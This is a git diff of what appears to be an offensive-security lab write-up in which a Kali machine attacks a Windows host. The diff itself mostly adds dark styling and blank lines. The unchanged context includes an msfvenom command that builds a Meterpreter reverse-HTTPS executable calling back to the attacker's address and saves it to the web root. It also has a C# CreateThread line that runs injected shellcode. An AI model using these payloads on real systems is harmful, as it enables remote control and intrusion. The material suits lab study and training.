@@ -1,7 +1,10 @@
+<div style="background-color: #000000;color: #ffffff;padding: 20px;border-radius: 10px;margin: 20px 0;font-family: 'Courier New', monospace;">
+
+
 <b><h1>Scenario 1</h1>
 - Kali = 192.168.2.3<br>
 - Windows = 192.168.2.5<br>
-
+</div>
 <h2>Practical explanation<br>
 1 ------ Payload Creation<br></h2>
 $ Msfvenom-p windows/meterpreter/reverse_https LHOST 192.168.2.3 LPORT 443 -f exe -o /var/www/html/msfstaged.exe <br>
@@ -409,4 +412,7 @@ IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 ````
 💡So, the payload is loaded and executed asynchronously using a new thread, allowing the injected code to run while the original process continues to operate.<br> 
                            ..................<b/>
+
+
+                           
                            
